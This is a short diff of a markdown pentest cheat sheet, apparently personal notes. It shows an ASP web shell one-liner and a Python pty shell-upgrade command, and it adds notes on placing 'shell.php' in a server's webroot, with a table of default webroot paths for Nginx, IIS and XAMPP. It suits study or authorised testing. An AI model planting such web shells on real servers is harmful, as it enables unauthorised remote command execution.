@@ -126,6 +126,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 # asp
 <% eval request("cmd") %>
 ```
+- we should put our script `shell.php` on the **webroot**
 
 Web Server | Default Webroot
 |--|--|
@@ -133,8 +134,10 @@ Web Server | Default Webroot
 `Nginx` | /usr/local/nginx/html/
 `IIS`  | c:\inetpub\wwwroot\
 `XAMPP` | C:\xampp\htdocs\
+
+then we can access the shell 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTIxMzI2MzA4NjcsLTkyODc3MDU1NSwxOD
+eyJoaXN0b3J5IjpbLTE3NzU0NDg4MTUsLTkyODc3MDU1NSwxOD
 k3OTI4NTE2LC0xMTE4MjIwNDMzLDExMzUwNTI2ODQsLTExNzk3
 NTEyMTUsLTE5NjQ5NDM4ODgsMTQ2MjE1MTkzLDY4MTMzMTc0OS
 w5MjIyNDU1MDcsMTQxNjU5OTA3MiwtNTcyODQ4MDQxLDE1MzUy
